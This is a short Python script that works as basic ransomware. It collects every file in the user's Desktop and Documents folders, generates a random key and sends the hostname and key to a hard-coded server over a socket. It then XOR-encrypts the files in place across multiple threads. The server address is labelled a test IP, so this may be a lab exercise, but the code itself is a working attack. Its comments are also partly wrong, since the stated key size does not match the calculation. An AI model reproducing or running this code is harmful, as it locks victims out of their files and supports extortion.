import socket, os, threading, queue, random
from telnetlib import ENCRYPT


def encrypt(key):
    while True:
        file = q.get()
        print(f"Encrypting {file}")
        try:
            key_index = 1
            max_key_index = len(key) - 1
            encrypted_data = ""
            with open(file, "rb") as f:
                data = f.read()
            with open(file, "w") as f:
                f.write("")
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, "ab") as f:
                    f.write(xor_byte.to_bytes(1, "little"))

                # Increment the key index
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
            print("File successfully encrypted!")
        except:
            print("Failed to encrypt file!")
        q.task_done()


# Socket information
IP = "192.168.1.68" # Test IP
PORT = 9700

# Encryption information
ENCRYPTION_LEVEL = 512 // 80  # 512-bit encryption = 64 bytes
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()"
CHARSET_LENGTH = len(CHARSET)

# Grab filenames to encrypt
print("Preparing files...")
desktop_path = os.environ["USERPROFILE"] + "/Desktop"
documents_path = os.environ["USERPROFILE"] + "/Documents"

desktop_files = os.listdir(desktop_path)
documents_files = os.listdir(documents_path)

abs_files = []

for f in desktop_files:
    if os.path.isfile(f"{desktop_path}/{f}") and f != __file__[:-2] + "exe":
        abs_files.append(f"{desktop_path}/{f}")

for f in documents_files:
    if os.path.isfile(f"{documents_path}/{f}") and f != __file__[:-2] + "exe":
        abs_files.append(f"{documents_path}/{f}")

print("Successfully located all files!")

# Grab client's hostname
hostname = os.getenv("COMPUTERNAME")

# Generate encryption key
print("Generating encryption key...")

key = ""

for i in range(ENCRYPTION_LEVEL):
    key += CHARSET[random.randint(0, CHARSET_LENGTH - 1)]
print("Key generated!")

# Connect to server to transfer key + hostname
with socket.socket() as sock:
    sock.connect((IP, PORT))
    print("Successfully connecting, sending hostname and key!")
    sock.send(f"{hostname} : {key}".encode("utf-8"))
    print("Finished sending data!")

# Store files in a queue for threads to handle
q = queue.Queue()
for f in abs_files:
    q.put(f)

# Set up threads for encryption
for i in range(15):
    t = threading.Thread(target=encrypt, args=(key, ), daemon=True)
    t.start()

q.join()
print("Finished encrypting and uploading!")
input()